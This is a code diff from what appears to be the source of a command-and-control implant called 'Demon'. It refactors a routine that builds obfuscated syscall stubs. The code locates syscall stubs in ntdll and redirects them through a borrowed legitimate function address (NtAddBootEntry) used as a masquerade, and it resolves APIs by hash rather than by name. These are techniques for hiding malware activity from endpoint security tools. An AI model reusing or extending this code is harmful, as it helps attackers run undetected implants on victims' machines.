@@ -1,7 +1,8 @@
 #include <Demon.h>
+
+#include <Common/Defines.h>
 #include <Core/Syscalls.h>
 #include <Core/MiniStd.h>
-#include <ntstatus.h>
 
 #ifdef OBF_SYSCALL
 
@@ -52,7 +53,7 @@ PVOID SyscallLdrNtdll()
 
 ULONG_PTR BuildSyscallStub( ULONG_PTR StubRegion, DWORD dwSyscallNo )
 {
-    LPVOID  Masquerade     = LdrFunctionAddr( Instance.Modules.Ntdll, 0x180024b6 );
+    LPVOID  Masquerade     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTADDBOOTENTRY );
     LPVOID  syscallAddress = Masquerade + 18;
     BYTE    SyscallStub[]  = { 0x4c, 0x8b, 0xd1, 0xb8, 0x00, 0x00, 0x00, 0x00, };
     UCHAR   jumpPrelude[]  = { 0x00, 0x49, 0xBB };
@@ -164,7 +165,7 @@ UINT SyscallsExtract( ULONG_PTR pNtdll, PSYSCALL_STUB Syscalls )
 {
     PUTS( "Start" )
 
-    LPVOID  FakeSyscall     = LdrFunctionAddr( Instance.Modules.Ntdll, 0x180024b6 );
+    LPVOID  FakeSyscall     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTADDBOOTENTRY );
     LPVOID  syscallAddress  = ( PCHAR ) FakeSyscall + 18;
     UCHAR   jumpPrelude[]   = { 0x00, 0x49, 0xBB };
     UCHAR   jumpAddress[]   = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
@@ -202,7 +203,7 @@ UINT SyscallsExtract( ULONG_PTR pNtdll, PSYSCALL_STUB Syscalls )
                 MemCopy( Name, FunctionName, StringLengthA( FunctionName ) );
 
                 *( PWORD ) ( Name ) = 'tN';
-                Syscalls[ uiCount ].Hash = HashStringA( Name );
+                Syscalls[ uiCount ].Hash = HashEx( Name, 0, TRUE );
 
                 MemCopy( pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE ), FunctionPtr, FunctionEnd - FunctionPtr - 13 );
                 MemCopy( pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE ) + 7, jumpPrelude, 3 );
